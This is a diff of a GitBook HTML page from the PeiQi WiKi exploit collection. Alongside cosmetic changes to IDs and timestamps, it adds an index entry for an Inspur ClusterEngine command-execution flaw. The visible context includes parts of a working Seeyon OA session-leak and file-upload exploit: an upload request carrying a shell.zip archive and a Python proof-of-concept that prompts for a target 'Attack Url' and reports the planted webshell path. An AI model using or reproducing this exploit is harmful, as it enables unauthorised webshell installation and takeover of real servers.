@@ -1428,6 +1428,19 @@
             
         </li>
     
+        <li class="chapter " data-level="2.2.10.3" data-path="../../服务器应用漏洞/浪潮/浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞.md">
+            
+                <span>
+            
+                    
+                    浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
 
             </ul>
             
@@ -4911,7 +4924,7 @@ method=access&amp;enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMx
 <p>[!NOTE]</p>
 <p>&#x8FD4;&#x56DE;&#x5305;&#x51FA;&#x73B0; Sset-Cookie &#x548C; a8genius.do &#x5373;&#x4E3A;&#x6210;&#x529F;&#x83B7;&#x53D6;</p>
 </blockquote>
-<p><a href="image/zhiyuan-46.png" data-lightbox="487bef39-3abe-409b-86dc-71f898fcdaaa" data-title=""><img src="image/zhiyuan-46.png" alt=""></a></p>
+<p><a href="image/zhiyuan-46.png" data-lightbox="bdb8549d-58cc-4748-aad7-f9a6d7a8aa4a" data-title=""><img src="image/zhiyuan-46.png" alt=""></a></p>
 <p>&#x4E0A;&#x4F20;&#x538B;&#x7F29;&#x5305;&#x6DFB;&#x52A0; Cookie&#x4E0A;&#x4F20;</p>
 <pre><code class="lang-js">POST /seeyon/fileUpload.do?method=processUpload HTTP/<span class="hljs-number">1.1</span>
 Host: xxx.xxx.xxx.xxx
@@ -4970,7 +4983,7 @@ method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=upload
 <p>&#x811A;&#x672C;&#x5728;&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#x7684; POC&#x4E2D;</p>
 <p>&#x5176;&#x4E2D;&#x542B;&#x6709;zip&#x538B;&#x7F29;&#x5305; shell.zip, &#x5982;&#x679C;&#x4E0A;&#x4F20;&#x5931;&#x8D25;&#x66F4;&#x6539;&#x4E00;&#x4E0B;&#x6587;&#x4EF6;&#x540D;</p>
 </blockquote>
-<p><a href="image/zhiyuan-47.png" data-lightbox="a15279ab-a7d1-4794-91f7-ffb426f535bd" data-title=""><img src="image/zhiyuan-47.png" alt=""></a></p>
+<p><a href="image/zhiyuan-47.png" data-lightbox="63acf0e2-74db-4607-8313-8282b591469b" data-title=""><img src="image/zhiyuan-47.png" alt=""></a></p>
 <pre><code class="lang-python"><span class="hljs-comment"># coding: utf-8</span>
 <span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">import</span> sys
@@ -4986,7 +4999,7 @@ method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=upload
     print(<span class="hljs-string">&apos;+  \033[34m&#x516C;&#x4F17;&#x53F7;  : PeiQi&#x6587;&#x5E93;                                                   \033[0m&apos;</span>)
     print(<span class="hljs-string">&apos;+  \033[34mVersion: &#x81F4;&#x8FDC;OA                                                   \033[0m&apos;</span>)
     print(<span class="hljs-string">&apos;+  \033[36m&#x4F7F;&#x7528;&#x683C;&#x5F0F;:  python3 poc.py                                            \033[0m&apos;</span>)
-    print(<span class="hljs-string">&apos;+  \033[36mFile         &gt;&gt;&gt; ip.txt                                             \033[0m&apos;</span>)
+    print(<span class="hljs-string">&apos;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                                \033[0m&apos;</span>)
     print(<span class="hljs-string">&apos;+------------------------------------------&apos;</span>)
 
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">POC_1</span><span class="hljs-params">(target_url)</span>:</span>
@@ -5027,7 +5040,6 @@ method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=upload
     print(<span class="hljs-string">&quot;\033[32m[o] &#x76EE;&#x6807; {} &#x6B63;&#x5728;&#x89E3;&#x538B;&#x6587;&#x4EF6;.... \033[0m&quot;</span>.format(target_url))
     <span class="hljs-keyword">try</span>:
         response = requests.post(vuln_url, data=post,headers=headers,timeout=<span class="hljs-number">60</span>,verify=<span class="hljs-keyword">False</span>)
-        print(response.text)
         <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">500</span>:
             print(<span class="hljs-string">&quot;\033[32m[o] &#x76EE;&#x6807; {} &#x89E3;&#x538B;&#x6587;&#x4EF6;&#x6210;&#x529F;.... \033[0m&quot;</span>.format(target_url))
             print(<span class="hljs-string">&quot;\033[32m[o] &#x9ED8;&#x8BA4;Webshell&#x5730;&#x5740;: {}/seeyon/common/designer/pageLayout/peiqi10086.jsp \033[0m&quot;</span>.format(target_url))
@@ -5044,9 +5056,9 @@ method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=upload
     target_url = str(input(<span class="hljs-string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))
     POC_1(target_url)
 </code></pre>
-<p><a href="image/zhiyuan-48.png" data-lightbox="f4ca185d-97fb-4805-81d8-8d5cab24a79f" data-title=""><img src="image/zhiyuan-48.png" alt=""></a> </p>
+<p><a href="image/zhiyuan-48.png" data-lightbox="ddc3e6a5-e0ff-4905-9077-90e4dfedaac3" data-title=""><img src="image/zhiyuan-48.png" alt=""></a> </p>
 <footer class="page-footer"><span class="copyright">PeiQi WiKi&#x6587;&#x5E93; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6587;&#x4EF6;&#x66F4;&#x65B0;&#x65F6;&#x95F4;&#xFF1A;
-2021-04-12 14:37:06
+2021-04-12 15:05:23
 </span></footer>
                                 
                                 </section>
@@ -5090,7 +5102,7 @@ method=ajaxAction&amp;managerName=portalDesignerManager&amp;managerMethod=upload
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"致远OA Session泄露 任意文件上传漏洞","level":"2.6.6.11","depth":3,"next":{"title":"帆软OA","level":"2.6.7","depth":2,"path":"PeiQi_Wiki/OA产品漏洞/帆软OA/README.md","ref":"PeiQi_Wiki/OA产品漏洞/帆软OA/README.md","articles":[{"title":"帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757","level":"2.6.7.1","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/帆软OA/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757.md","ref":"PeiQi_Wiki/OA产品漏洞/帆软OA/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757.md","articles":[]},{"title":"帆软 V9 任意文件覆盖文件上传","level":"2.6.7.2","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/帆软OA/帆软 V9 任意文件覆盖文件上传.md","ref":"PeiQi_Wiki/OA产品漏洞/帆软OA/帆软 V9 任意文件覆盖文件上传.md","articles":[]}]},"previous":{"title":"致远OA webmail.do任意文件下载 CNVD-2020-62422","level":"2.6.6.10","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA webmail.do任意文件下载 CNVD-2020-62422.md","ref":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA webmail.do任意文件下载 CNVD-2020-62422.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WIKI"},"livereload":{},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA Session泄露 任意文件上传漏洞.md","mtime":"2021-04-12T06:37:06.483Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-04-12T06:37:36.082Z"},"basePath":"../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"致远OA Session泄露 任意文件上传漏洞","level":"2.6.6.11","depth":3,"next":{"title":"帆软OA","level":"2.6.7","depth":2,"path":"PeiQi_Wiki/OA产品漏洞/帆软OA/README.md","ref":"PeiQi_Wiki/OA产品漏洞/帆软OA/README.md","articles":[{"title":"帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757","level":"2.6.7.1","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/帆软OA/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757.md","ref":"PeiQi_Wiki/OA产品漏洞/帆软OA/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757.md","articles":[]},{"title":"帆软 V9 任意文件覆盖文件上传","level":"2.6.7.2","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/帆软OA/帆软 V9 任意文件覆盖文件上传.md","ref":"PeiQi_Wiki/OA产品漏洞/帆软OA/帆软 V9 任意文件覆盖文件上传.md","articles":[]}]},"previous":{"title":"致远OA webmail.do任意文件下载 CNVD-2020-62422","level":"2.6.6.10","depth":3,"path":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA webmail.do任意文件下载 CNVD-2020-62422.md","ref":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA webmail.do任意文件下载 CNVD-2020-62422.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WIKI"},"livereload":{},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/OA产品漏洞/致远OA/致远OA Session泄露 任意文件上传漏洞.md","mtime":"2021-04-12T07:05:23.659Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-04-12T12:39:01.842Z"},"basePath":"../../..","book":{"language":""}});
         });
     </script>
 </div>
